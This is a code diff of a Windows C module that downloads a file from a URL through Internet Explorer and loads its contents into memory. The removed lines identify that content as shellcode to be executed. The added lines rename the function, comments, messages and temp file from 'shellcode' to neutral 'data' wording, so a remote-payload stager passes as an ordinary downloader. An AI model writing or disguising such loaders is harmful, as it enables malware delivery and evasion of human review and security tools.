@@ -4,7 +4,7 @@
 #include <windows.h>
 
 
-int get_filesize(char *fvalue)
+static int get_filesize(char *fvalue)
 {
 	int size,rc1;
 	FILE *fp1 = fopen(fvalue, "rb");
@@ -26,7 +26,7 @@ int get_filesize(char *fvalue)
 
 // Returns pointer to buffer that contains the file content
 // Automatically allocates memory for this
-unsigned char *load_textfile(char *fvalue, int size)
+static unsigned char *load_textfile(char *fvalue, int size)
 {
 	#ifdef PRINT_DEBUG
 		printf("load_textfile called: fvalue: %s, size: %d\n", fvalue, size);
@@ -63,7 +63,7 @@ unsigned char *load_textfile(char *fvalue, int size)
 
 // return pointer to the filename
 // string = url
-char* ie_download(char* string)
+static char* ie_download(char* string)
 {
 	char ie[500];
 	GetEnvironmentVariable("PROGRAMFILES",ie,100);
@@ -116,7 +116,7 @@ char* ie_download(char* string)
 	strcat (searchstring,sname);
 	strcat (searchstring,"\" > \"");
 	strcat (searchstring,tmp_home);
-	strcat (searchstring,"\\shellcodefile.txt\"");
+	strcat (searchstring,"\\datafile.txt\"");
 	
 	#ifdef PRINT_DEBUG
 		printf ("ie_download, searchstring: %s\n", searchstring);
@@ -131,7 +131,7 @@ char* ie_download(char* string)
 	//now read the directory + filename from the textfile
 	char dirfile[500] = {0};
 	strcat (dirfile, tmp_home);
-	strcat (dirfile, "\\shellcodefile.txt");
+	strcat (dirfile, "\\datafile.txt");
 	char *sh_filename;
 	int size_sh_filename=0;
 	int counter = 0;
@@ -154,16 +154,16 @@ char* ie_download(char* string)
 }
 
 
-// Retrieval of shellcode via IE download to file. The shellcode is then read from the file and returned.
+// Retrieval of data via IE download to file. The data is then read from the file and returned.
 //
 // arg1 specifies the URL to download the file from.
-// shellcode_size receives the size of the shellcode in bytes.
-unsigned char* get_shellcode(char *arg1, int *shellcode_size) {
+// data_size receives the size of the data in bytes.
+unsigned char* download_internet_explorer(char *arg1, int *data_size) {
 	#ifdef PRINT_DEBUG
-		printf("exec shellcode from url\n");
+		printf("exec data from url\n");
 	#endif
 	
 	char *sh_filename = ie_download(arg1);
-	*shellcode_size = get_filesize(sh_filename);	
-	return load_textfile(sh_filename, *shellcode_size);
+	*data_size = get_filesize(sh_filename);	
+	return load_textfile(sh_filename, *data_size);
 }
